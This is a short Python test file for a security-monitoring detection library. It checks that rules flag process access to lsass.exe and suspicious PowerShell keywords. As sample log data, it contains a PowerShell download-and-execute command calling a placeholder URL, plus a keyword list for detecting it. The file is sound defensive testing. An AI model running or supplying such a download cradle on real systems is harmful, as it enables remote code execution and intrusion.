import pandas as pd
from socbox.detect.rules import suspicious_process_access


def test_suspicious_process_access_finds_target():
    df = pd.DataFrame(
        [
            {
                "@timestamp": "2020-01-01T00:00:00Z",
                "event.action": "10",
                "host.name": "HOST1",
                "user.name": "NT AUTHORITY\\SYSTEM",
                "process.name": "C:\\Windows\\System32\\svchost.exe",
                "process.target": "C:\\Windows\\System32\\lsass.exe",
                "process.granted_access": "0x1000",
            }
        ]
    )
    alerts = suspicious_process_access(df, target_processes=["\\lsass.exe"], min_events=1)
    assert len(alerts) == 1


def test_powershell_keywords_rule_hits():
    from socbox.detect.rules import powershell_suspicious_keywords

    df = pd.DataFrame(
        [
            {
                "@timestamp": "2020-01-01T00:00:00+00:00",
                "event.action": "4103",
                "host.name": "HOST1",
                "user.name": "user1",
                "message": "powershell IEX (New-Object Net.WebClient).DownloadString('http://x')",
            }
        ]
    )
    alerts = powershell_suspicious_keywords(
        df,
        event_ids=["4103"],
        keywords=["iex", "new-object net.webclient", "downloadstring"],
        min_keyword_hits=1,
        max_samples=10,
    )
    assert len(alerts) == 1